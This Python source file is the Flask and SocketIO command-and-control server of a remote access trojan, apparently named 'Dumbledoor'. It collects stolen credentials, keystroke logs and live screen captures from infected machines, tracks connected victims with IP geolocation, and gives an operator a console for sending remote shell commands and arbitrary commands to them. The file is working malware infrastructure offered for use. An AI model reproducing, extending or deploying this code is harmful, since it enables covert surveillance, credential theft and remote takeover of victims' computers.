import os
from flask import Flask, render_template, request, Response, send_file, jsonify
from flask_socketio import SocketIO, emit
import logging
import threading
from io import *
import base64
from time import sleep
import os
import random
import time
import socketio
import json
import requests
from flask_limiter import Limiter
from flask_limiter.util import get_remote_address
#v1.1
TOKEN = os.environ['ipinfo-token']
app = Flask('app')
app.config['SECRET_KEY'] = os.environ['flask-session-key']
socketio = SocketIO(app)
about = '''
Dumbledoor by posydon
Created using socketio and Flask, as a replacement for Dobby, the best RAT of all time
Use with caution!
“Happiness can be found in the darkest of times, if one only remembers to turn on the light.” - Dumbledoor
https://github.com/p0syd0n/dumbledoor
https://github.com/p0syd0n/snape
https://github.com/p0syd0n/dumbledoor-panel
'''
limiter = Limiter(
  app, default_limits=["100000 per day", "150000 per hour", "250 per second"])

log = logging.getLogger('werkzeug')
log.setLevel(logging.ERROR)
connected = {}


def ip_lookup(ip):
  url = f'http://ipinfo.io/{ip}?token={TOKEN}'
  response_ipinfo = eval(
    requests.get(url, headers={
      'User-agent': f'snape@{id}'
    }).text)
  response_ipinfo[
    'google-maps-link'] = f"https://www.google.com/maps/search/{response_ipinfo['loc']}"
  for key in response_ipinfo:
    print(f"{key}: {response_ipinfo[key]}")


@app.route('/screen-feed', methods=['POST'])
def save_file():
    file = request.files['file']
    id = request.args.get('id')
    #print(id)# Retrieve the value of the 'id' query parameter

    if file and id:
        file.save(f"endpoint/screen_feed/file_screen_{id}.jpg")  # Save the file with the dynamic file name
        return 'File saved successfully.'
    else:
        return 'No file received or missing id parameter.'

@app.route('/feed')
def index():
    return render_template('feed.html')  # Provide your own HTML template for displaying the live feed

@app.route('/test')
def test_page():
    return render_template('test.html')  # Provide your own HTML template for displaying the live feed

@app.route('/live-feed')
def live_feed():
    id = request.args.get('id')# Retrieve the value of the 'id' query parameter
    def generate__(id):
        while True:
            with open(f"endpoint/screen_feed/file_screen_{id}.jpg", 'rb') as image_file:
                yield (b'--frame\r\n'
                       b'Content-Type: image/jpeg\r\n\r\n' + image_file.read() + b'\r\n\r\n')
            # Wait for a short period of time before serving the next image
            time.sleep(0.1)

    if id != 'null':
        return Response(generate__(id), mimetype='multipart/x-mixed-replace; boundary=frame')
    else:
        return 'Missing id parameter.'

@app.route('/recieve_creds')
def recieve_creds():
  log(f"\ncreds: {request.args['data']}")
  with open('endpoint/creds.txt', 'a') as file:
    file.write(f"\ncreds: {request.args['data']}")
    file.close()
  return '200'


@app.route('/')
def hello_world():
  return '''
success
'''

@app.route('/api')
def api():
  type = request.args['type']
  match type:
    case 'online':
      return json.dumps(connected)
    case 'command':
      command_data = {
        'repeat': request.args['repeat'],
        'command': request.args['command'],
        'param1': request.args['param1'],
        'param2': request.args['param2'],
        'param3': request.args['param3'],
        'param4': request.args['param4'],
        'id': request.args['id'],
        'api': True
      }
      socketio.emit('command', data=command_data)
      return '200'
    case _:
      return '400: No such api command'
  
@app.route('/mp3')
def get_mp3():
  return send_file('file.mp3', as_attachment=True)

@app.route('/keys', methods=['POST'])
def keys():
  data = request.data
  key = data['keys']
  with open('endpoint/keys/keys.txt', 'a') as file:
    file.write(key)

@app.route('/upload', methods=['POST'])
def upload():
  image_file = request.files['image']
  # Save the file to disk
  path = random.randint(0, 100)
  save_path = os.path.join('endpoint', 'image' + str(path) + ".png")
  image_file.save(save_path)
  print(f'saved as {path}')
  return "200"


def monitor_mode():
  global connected
  os.system('clear')
  while True:
    os.system('clear')
    table = '''|-------------------|-------------|'''
    for id in connected:
      table += f"\n|{id}|{connected[id]['ip']}|"
    print(table)
    sleep(1)


def shell():
  global connected
  sleep(2)
  menu()
  while True:
    elder_wand = get()
    for key in connected:
      if key == elder_wand:
        while True:
          spell = get_spec(elder_wand)
          if spell == 'info':
            print(f'\nInfo on {elder_wand}')
            for key2 in connected[key]:
              print(key2+": "+connected[key][key2])
            else:
              continue
          elif spell == 'shell':
            while True:
              command = get_spec(f"{elder_wand}/shell")
              if command == 'END':
                break
              else:
                command_data = {'command': command, 'id': elder_wand, 'api': 'False'}
                socketio.emit('shell', command_data)
                sleep(3)
          elif spell == 'curse':
            while True:
              specs = get_spec(f'{elder_wand}/curse')
              if specs == 'END':
                break
              else:
                split_specs = specs.split()
                try:
                  repeat = split_specs[0]
                except:
                  print("whats the repeat you donkey")
                  break
                try:
                  command = split_specs[1]
                except:
                  print("what's the command dumbfuck")
                  break
                try:
                  param1 = split_specs[2].replace("`", " ")
                except:
                  param1 = None
                try:
                  param2 = split_specs[3].replace("`", " ")
                except:
                  param2 = None
                try:
                  param3 = split_specs[4].replace("`", " ")
                except:
                  param3 = None
                try:
                  param4 = split_specs[5].replace("`", " ")
                except:
                  param4 = None
                command_data = {
                  'repeat': repeat,
                  'command': command,
                  'param1': param1,
                  'param2': param2,
                  'param3': param3,
                  'param4': param4,
                  'id': elder_wand,
                  'api': False
                }

                socketio.emit('command', data=command_data)
                #removed specific SID sending: room=connected[key]['sid']
                sleep(3)
          elif spell == 'END':
            break

    if elder_wand == 'list':
      for key in connected:
        print(f"{key}: {connected[key]['username']}")
        print(f'total: {len(connected)}')
    elif elder_wand == 'about':
      print(about)

    elif elder_wand == 'menu':
      menu()

    elif elder_wand == 'ip-lookup':
      ip_lookup(get_spec('ip-lookup/ip'))

    elif elder_wand == 'clear_cache':
      connected = {}
      os.system('clear')
      print(
        'Cache has been cleared. Please allow up to 10 seconds for clients to reconnect to the server'
      )

    elif elder_wand == 'monitor':
      monitor_mode()


def menu():
  os.system('clear')
  print('DUMBLEDOOR by posydon')
  print('"Curiosity is not a sin..."- Dumbledoor')
  print(f'connected: {len(connected)}')


def get():
  return input("dumbledoor$ ")


def get_spec(spec):
  return input(f"dumbledoor/{spec}$ ")


@socketio.on('message')
def message(json):
  pass
  
@socketio.on('clear_cache')
def clear_cache():
  global connected
  connected = {}
  log('cleared')
  socketio.emit('api_response', data={'id': 'SERVER', 'output': 'cache cleared'})
  
@socketio.on('online_check')
def online_check():
  print(f'api called for online: {connected}')
  socketio.emit('api_response_online', data=connected)

@socketio.on('api_start_command')
def api_start_command(data):
  print(data)
  if data['type'] == 'shell':
    command_data = {'id': data['id'], 'command': data['command'], 'api': data['api']}
    socketio.emit('shell', data=command_data)
  else:
    command_data = {
      'repeat': int(data['repeat']),
      'command': data['command'],
      'param1': data['param1'],
      'param2': data['param2'],
      'param3': data['param3'],
      'param4': data['param4'],
      'id': data['id'],
      'api': 'True'
    }
    socketio.emit('command', data=command_data)
    log(f"command started: {command_data}")
  

@socketio.on('response')
def response(data):
  if eval(data['api']):
    api_response(str(json.dumps(data)))
  else:
    print(data['output'])

def api_response(data):
  log(f'data sent: {data}')
  socketio.emit('api_response', data=data)

@socketio.on('log')
def log(data):
  try:
    with open('log.txt', 'a') as log:
      try:
        log.write('\n' + str(data['content']))
        log.close()
      except:
        log.write('\n'+str(data))
        log.close()
  except:
    pass


@socketio.on('check_in')
def check_in(json):
  if json['id'] in connected:
    pass
  else:
    connected[json['id']] = json
    connected[json['id']]['sid'] = str(request.sid)


@app.route('/clients')
def get_clients():
  # get the dictionary of connected clients
  clients = socketio.server.manager.rooms['/'].keys()
  # convert the dictionary keys to a list and return it
  return {'clients': list(clients)}

shell_thread = threading.Thread(target=shell)
shell_thread.start()

socketio.run(app, host='0.0.0.0', port=8080)
